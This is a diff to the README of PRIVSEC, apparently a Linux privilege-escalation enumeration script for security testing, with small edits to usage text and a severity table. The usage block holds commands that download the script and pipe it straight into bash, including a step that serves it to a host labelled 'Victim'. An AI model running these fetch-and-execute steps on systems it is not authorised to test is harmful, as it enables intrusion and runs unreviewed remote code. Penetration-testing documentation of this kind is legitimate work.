@@ -24,7 +24,7 @@ PRIVSEC performs 14 targeted security checks to identify common privilege escala
 ## Usage
 
 ```bash
-# One-Liner | Direct Use
+# Direct Use
 curl -L https://raw.githubusercontent.com/syrusnfs/privsec/main/privsec.sh | bash
 
 # Download
@@ -32,6 +32,9 @@ curl -L https://github.com/syrusnfs/privsec/raw/main/privsec.sh -o privsec.sh
 
 # Set execute
 chmod +x privsec.sh
+
+# Options
+./privsec.sh -h
 
 # Run 
 ./privsec.sh
@@ -41,17 +44,17 @@ chmod +x privsec.sh
 
 # Local network
 sudo python3 -m http.server $PORT #Host
-curl $HOSTIP/privsec.sh | sh #Victim
+curl $HOSTIP/privsec.sh | bash #Victim
 ```
 
 ## Severity Levels
 
-| Level | Icon | Description |
+| Level | Color | Description |
 |-------|------|-------------|
-| **CRITICAL** | ● (Red) | Confirmed exploitation vectors - immediate action required |
-| **MEDIUM** | ◐ (Yellow) | Potential issues requiring manual validation |
-| **INFORMATIONAL** | ℹ (Cyan) | Contextual security information |
-| **PASS** | ○ (Green) | Security check passed |
+| **CRITICAL** |  Red  | Confirmed exploitation vectors - immediate action required |
+| **MEDIUM** |  Yellow  | Potential issues requiring manual validation |
+| **INFORMATIONAL** |  Cyan  | Contextual security information |
+| **PASS** |  Green  | Security check passed |
 
 ## Security Modules
 
